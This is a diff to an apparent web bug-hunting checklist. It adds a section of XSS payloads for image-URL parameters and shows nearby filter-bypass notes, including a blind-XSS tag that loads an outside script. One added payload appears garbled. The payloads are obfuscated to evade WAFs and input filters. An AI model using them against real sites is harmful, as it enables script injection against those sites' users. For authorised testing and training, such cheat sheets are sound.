@@ -157,7 +157,7 @@ Look for repeating blocks like AAAAAAA aaaaaa BBBBB
 <script src=//xss.ht></script>
 ```
 
-## Unicode Normalization
+## ⚒️ Unicode Normalization
 - [ ] Don't give up if `<`, `>`, `"` or `'` are filtered! Many apps normalize Unicode after the WAF/security layer.
 
 📌 *Some bypass variants (URL-encoded)*
@@ -171,6 +171,17 @@ Look for repeating blocks like AAAAAAA aaaaaa BBBBB
 For example, inject `%EF%BC%9Cscript%EF%BC%9E` and check if it reflects as `<script>` in the DOM.
 
 Automate these quirks with recollapse :  https://github.com/0xacb/recollapse
+
+
+## 🚧 If SSRF is not works in image url parameter then try XSS
+
+📌 *In image parameter you can use these type of payloads*
+```
+<svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))>
+<svg onload=eval(http://window.name)>
+"><svg onload=prompt(document.domain);>.png
+嘼svg><script>a<!>l<!>e<!>r<!>t<!>(<!>1<!>)</script>
+```
 
 ---
 ## 💡 Pro Tips
